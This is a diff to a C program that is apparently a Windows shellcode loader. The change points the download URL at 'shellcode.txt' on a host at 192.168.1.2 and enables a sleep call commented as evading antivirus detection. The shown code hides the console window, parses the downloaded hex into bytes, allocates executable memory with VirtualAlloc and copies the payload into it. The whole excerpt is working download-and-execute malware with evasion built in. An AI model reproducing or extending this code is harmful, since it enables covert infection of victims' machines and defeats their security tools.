@@ -27,7 +27,7 @@ int main()
 {
 	Stealth();											//Calls the Stealth() function to hide console windows
 	const int bufLen = 1024;
-	char url[] = "http://192.168.1.2/version2.c";
+	char url[] = "http://192.168.1.2/shellcode.txt";
 	char *szUrl = url;
 	long fileSize;
 	char *memBuffer, *headerBuffer;
@@ -48,7 +48,9 @@ int main()
 		sscanf(memBuffer, "%02hhx", &buff[count]);
 		memBuffer=memBuffer+4;
 	}
-	//Sleep(20000);				//Sleeps for 20 seconds to avoid AV detection
+	
+	Sleep(10000);				//Sleeps for 10 seconds to avoid AV detection
+	
 	void *exec = VirtualAlloc(0, sizeof buff, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, buff, sizeof buff);
 
